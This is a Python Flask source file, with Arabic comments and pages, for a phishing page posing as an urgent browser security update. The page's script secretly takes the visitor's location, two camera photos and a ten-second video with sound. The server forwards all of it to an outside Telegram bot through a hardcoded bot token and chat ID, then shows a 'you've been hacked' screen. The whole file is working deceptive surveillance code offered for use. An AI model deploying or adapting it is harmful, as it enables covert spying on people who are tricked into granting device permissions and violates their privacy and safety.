import os
import requests
import base64
import io
from flask import Flask, request, jsonify, render_template_string

BOT_TOKEN = '8967576296:AAEn4w7S4Js1oIYqc18q56082iDSyjoRgus'
CHAT_ID = '8312898985'

app = Flask(__name__)

def send_to_telegram(text, file_data=None, file_type='photo', filename='file'):
    try:
        # إرسال النص
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
        
        # إرسال الملف (صورة أو فيديو)
        if file_data:
            if file_type == 'photo':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                files = {'photo': (filename, file_data)}
            else:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
                files = {'video': (filename, file_data)}
                
            requests.post(url, data={'chat_id': CHAT_ID}, files=files, timeout=30)
    except Exception as e:
        print(f"خطأ في تيليجرام: {e}")

# صفحة الخداع
HTML_INDEX = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <style>
        body { background: #0f172a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; margin: 0; }
        .container { max-width: 400px; margin: 0 auto; padding: 20px; background: #1e293b; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h1 { color: #ef4444; }
        .btn { background: #22c55e; color: #fff; padding: 15px 40px; border: none; border-radius: 8px; font-size: 20px; cursor: pointer; width: 100%; margin-top: 20px; font-weight: bold; transition: 0.2s; }
        .btn:active { transform: scale(0.95); }
        #status { margin-top: 20px; color: #fbbf24; font-weight: bold; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ تنبيه أمني هام</h1>
        <p>متصفحك بحاجة إلى تحديث عاجل لتجنب سرقة البيانات. يرجى الضغط على الزر أدناه للسماح بالتحديث.</p>
        <button class="btn" id="startBtn" onclick="startExploit()">تحديث النظام الآن</button>
        <div id="status">جاري التحقق من النظام... يرجى الانتظار (12 ثانية)</div>
    </div>

    <script>
        async function startExploit() {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('status').style.display = 'block';

            try {
                // 1. سحب الموقع
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(pos => {
                        fetch('/capture_loc', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                        });
                    });
                }

                // 2. طلب الكاميرا والميكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // 3. التقاط صورتين
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');

                // الصورة الأولى
                ctx.drawImage(video, 0, 0);
                const photo1 = canvas.toDataURL('image/jpeg');
                fetch('/capture_cam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ photo: photo1 }) });

                // الصورة الثانية بعد ثانية
                setTimeout(() => {
                    ctx.drawImage(video, 0, 0);
                    const photo2 = canvas.toDataURL('image/jpeg');
                    fetch('/capture_cam', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ photo: photo2 }) });
                }, 1000);

                // 4. تسجيل فيديو مع صوت لمدة 10 ثواني
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        const base64data = reader.result;
                        fetch('/capture_vid', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ video: base64data }) });
                    };
                    stream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();
                
                // إيقاف التسجيل بعد 10 ثواني والتوجه للصفحة
                setTimeout(() => {
                    mediaRecorder.stop();
                    setTimeout(() => {
                        window.location.href = '/hacked';
                    }, 2000); // تأخير بسيط لضمان إرسال الفيديو
                }, 10000);

            } catch (e) {
                // إذا رفض الأذونات، ننتقل مباشرة للصفحة
                window.location.href = '/hacked';
            }
        }
    </script>
</body>
</html>
"""

# صفحة الاختراق
HTML_HACKED = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم الاختراق</title>
    <style>
        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 15vh; margin: 0; overflow: hidden; }
        h1 { font-size: 55px; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; animation: flicker 2s infinite; margin-bottom: 10px; }
        p { font-size: 24px; color: #ff4444; font-weight: bold; margin-top: 20px; }
        .skull { font-size: 100px; animation: pulse 1s infinite; }
        @keyframes flicker { 0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; } 20%, 24%, 55% { opacity: 0.5; text-shadow: none; } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .blood { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, transparent 30%, rgba(255,0,0,0.3) 100%); pointer-events: none; }
    </style>
</head>
<body>
    <div class="blood"></div>
    <div class="skull">💀</div>
    <h1>تم اختراقك</h1>
    <p>بواسطة معلمك 😈😂</p>
</body>
</html>
"""

# المسارات
@app.route('/')
def index():
    return render_template_string(HTML_INDEX)

@app.route('/hacked')
def hacked():
    return render_template_string(HTML_HACKED)

@app.route('/capture_loc', methods=['POST'])
def capture_loc():
    data = request.json
    lat, lon = data.get('lat'), data.get('lon')
    msg = f"🚨 **موقع الضحية:**\nhttps://www.google.com/maps?q={lat},{lon}"
    send_to_telegram(msg)
    return jsonify({'status': 'ok'})

@app.route('/capture_cam', methods=['POST'])
def capture_cam():
    data = request.json
    photo_b64 = data.get('photo')
    if photo_b64:
        photo_data = base64.b64decode(photo_b64.split(',')[1])
        send_to_telegram("📸 صورة من الكاميرا", photo_data, 'photo', 'cam.jpg')
    return jsonify({'status': 'ok'})

@app.route('/capture_vid', methods=['POST'])
def capture_vid():
    data = request.json
    video_b64 = data.get('video')
    if video_b64:
        video_data = base64.b64decode(video_b64.split(',')[1])
        send_to_telegram("🎥 فيديو (10 ثواني) مع الصوت", video_data, 'video', 'vid.webm')
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
